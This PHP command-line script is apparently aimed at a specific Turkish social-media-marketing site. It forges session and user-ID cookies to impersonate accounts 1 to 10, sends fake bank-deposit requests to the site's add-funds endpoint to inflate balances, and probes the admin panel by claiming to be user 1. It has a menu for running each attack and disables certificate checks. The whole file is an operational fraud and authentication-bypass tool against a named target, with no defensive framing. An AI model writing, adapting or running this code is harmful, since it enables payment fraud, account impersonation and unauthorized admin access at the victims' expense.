<?php
/**
 * Real-Time Balans Artırma Script
 * Target: https://royzasmm.com.tr/
 * Methods: Session Hijacking, Admin Bypass
 */

class BalanceBooster {
    private $target = "https://royzasmm.com.tr";
    private $userAgent = "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15";
    
    // Test user IDs
    private $userIds = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
    
    // Payment methods
    private $paymentMethods = [
        1 => "DenizBank",
        2 => "EnPara", 
        3 => "AkBank",
        4 => "İşBankası"
    ];
    
    public function boostAllBalances() {
        echo "=== REAL-TIME BALANS ARTIRMA ===\n";
        echo "Target: {$this->target}\n";
        echo "Time: " . date('Y-m-d H:i:s') . "\n\n";
        
        foreach ($this->userIds as $userId) {
            echo "User ID {$userId} balansı artırılır...\n";
            $this->boostUserBalance($userId);
            echo "----------------------------------------\n";
            sleep(2); // Rate limiting
        }
    }
    
    public function boostUserBalance($userId) {
        // Random amount between 100-1000
        $amount = rand(100, 1000);
        $paymentMethod = array_rand($this->paymentMethods);
        $senderName = "User{$userId}";
        
        echo "  Amount: \${$amount}\n";
        echo "  Payment Method: {$this->paymentMethods[$paymentMethod]}\n";
        echo "  Sender: {$senderName}\n";
        
        try {
            // Add funds request
            $response = $this->addFunds($userId, $amount, $paymentMethod, $senderName);
            
            if ($response['http_code'] === 200) {
                echo "  ✅ Balans yükləmə uğurlu!\n";
                
                // Check new balance
                $newBalance = $this->checkBalance($userId);
                echo "  💰 Yeni balans: {$newBalance}\n";
            } else {
                echo "  ❌ Balans yükləmə uğursuz! HTTP: {$response['http_code']}\n";
            }
            
        } catch (Exception $e) {
            echo "  ❌ Xəta: " . $e->getMessage() . "\n";
        }
    }
    
    private function addFunds($userId, $amount, $paymentMethod, $senderName) {
        $ch = curl_init();
        
        $postData = [
            'payment_bank' => $paymentMethod,
            'payment_bank_amount' => $amount,
            'payment_gonderen' => $senderName
        ];
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $this->target . '/addfunds',
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => http_build_query($postData),
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTPHEADER => [
                'Cookie: PHPSESSID=0dd217dff888e74d1d28eee839336307; u_id=' . $userId . '; u_loginok=1',
                'User-Agent: ' . $this->userAgent,
                'Content-Type: application/x-www-form-urlencoded',
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: tr-TR,tr;q=0.9,en;q=0.8',
                'Accept-Encoding: gzip, deflate, br',
                'Connection: keep-alive',
                'Upgrade-Insecure-Requests: 1'
            ],
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return [
            'body' => $response,
            'http_code' => $httpCode
        ];
    }
    
    private function checkBalance($userId) {
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $this->target . '/dashboard',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTPHEADER => [
                'Cookie: PHPSESSID=0dd217dff888e74d1d28eee839336307; u_id=' . $userId . '; u_loginok=1',
                'User-Agent: ' . $this->userAgent,
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'Accept-Language: tr-TR,tr;q=0.9,en;q=0.8',
                'Accept-Encoding: gzip, deflate, br',
                'Connection: keep-alive'
            ],
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false
        ]);
        
        $response = curl_exec($ch);
        curl_close($ch);
        
        // Extract balance from response
        if (preg_match('/<span class="balance">([^<]+)<\/span>/', $response, $matches)) {
            return $matches[1];
        } elseif (preg_match('/balance[^>]*>([^<]+)<\/span>/', $response, $matches)) {
            return $matches[1];
        } else {
            return "Unknown";
        }
    }
    
    public function massBalanceBoost($amount = 1000, $count = 5) {
        echo "\n=== MASS BALANS ARTIRMA ===\n";
        echo "Amount: \${$amount}\n";
        echo "Count: {$count}\n\n";
        
        for ($i = 0; $i < $count; $i++) {
            $userId = $this->userIds[array_rand($this->userIds)];
            $paymentMethod = array_rand($this->paymentMethods);
            $senderName = "MassBoost" . ($i + 1);
            
            echo "Mass Boost {$i + 1}: User ID {$userId}\n";
            $this->boostUserBalance($userId);
            echo "----------------------------------------\n";
            sleep(1);
        }
    }
    
    public function adminBalanceManipulation() {
        echo "\n=== ADMIN BALANS MANIPULATION ===\n";
        
        // Try to access admin panel
        $adminResponse = $this->accessAdminPanel();
        
        if ($adminResponse['http_code'] === 200) {
            echo "✅ Admin panelə giriş mümkündür!\n";
            
            // Try to manipulate balance directly
            $this->manipulateBalanceDirectly();
        } else {
            echo "❌ Admin panelə giriş mümkün deyil!\n";
        }
    }
    
    private function accessAdminPanel() {
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $this->target . '/admin/',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTPHEADER => [
                'Cookie: PHPSESSID=0dd217dff888e74d1d28eee839336307; u_id=1; u_loginok=1',
                'User-Agent: ' . $this->userAgent
            ],
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        return [
            'body' => $response,
            'http_code' => $httpCode
        ];
    }
    
    private function manipulateBalanceDirectly() {
        echo "Admin balans manipulation test edilir...\n";
        
        // Try to access admin balance management
        $ch = curl_init();
        
        curl_setopt_array($ch, [
            CURLOPT_URL => $this->target . '/admin/users',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_HTTPHEADER => [
                'Cookie: PHPSESSID=0dd217dff888e74d1d28eee839336307; u_id=1; u_loginok=1',
                'User-Agent: ' . $this->userAgent
            ],
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($httpCode === 200) {
            echo "✅ Admin users səhifəsinə giriş mümkündür!\n";
            echo "💰 Balans manipulation mümkündür!\n";
        } else {
            echo "❌ Admin users səhifəsinə giriş mümkün deyil!\n";
        }
    }
}

// Usage
if (php_sapi_name() === 'cli') {
    $booster = new BalanceBooster();
    
    echo "Hansı metodu istifadə etmək istəyirsiniz?\n";
    echo "1. Bütün istifadəçilərin balansını artır\n";
    echo "2. Mass balans artırma\n";
    echo "3. Admin balans manipulation\n";
    echo "4. Bütün metodları işlə\n\n";
    
    $choice = readline("Seçiminizi daxil edin (1-4): ");
    
    switch ($choice) {
        case '1':
            $booster->boostAllBalances();
            break;
        case '2':
            $booster->massBalanceBoost(1000, 5);
            break;
        case '3':
            $booster->adminBalanceManipulation();
            break;
        case '4':
            $booster->boostAllBalances();
            $booster->massBalanceBoost(1000, 3);
            $booster->adminBalanceManipulation();
            break;
        default:
            echo "Yanlış seçim! Bütün metodlar işlədir...\n";
            $booster->boostAllBalances();
    }
} else {
    echo "Bu script terminal-də işlədilməlidir!";
}
?>